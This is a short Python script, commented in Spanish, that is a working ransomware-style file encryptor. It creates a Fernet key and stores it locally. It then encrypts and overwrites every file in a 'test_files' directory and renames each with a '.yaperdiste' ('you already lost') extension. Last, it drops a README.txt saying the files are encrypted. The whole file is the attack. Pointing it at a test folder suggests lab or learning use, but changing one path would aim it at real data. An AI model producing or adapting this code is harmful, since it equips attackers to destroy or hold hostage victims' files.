from cryptography.fernet import Fernet
import os

# Extensión para los archivos encriptados.
extension = 'yaperdiste'

# Función para generar la clave de cifrado y almacenada en un archivo en el directorio local.
def generate_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

# Función para obtener la clave de cifrado del archivo local.
def charger_key():
    return open('key.key', 'rb').read()

# Función para encriptar los archivos y su renombramiento con la extensión personalizada.
def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()

        encrypted_data = f.encrypt(file_data)

        with open(item, 'wb') as file:
            file.write(encrypted_data)

        os.rename(item, item + '.' + extension)

if __name__ == '__main__':

    try:
        # Directorio que vamos a cifrar.
        path_to_encrypt = 'test_files'

        # Obtenemos los archivos del directorio a cifrar  los guardamos en una lista.
        items = os.listdir(path_to_encrypt)
        full_path = [path_to_encrypt + '\\' + item for item in items]

        # Generación la clave de cifrado y se almacena en una variable.
        generate_key()
        key = charger_key()

        # Encriptación de los archivos listados.
        encrypt(full_path, key)

        # Mensaje ficheros encriptados en un file creado como .txt
        with open( path_to_encrypt + '\\README.txt', 'w') as file:
            file.write('Ficheros encriptados.\n')

    except Exception as e:
        print(e)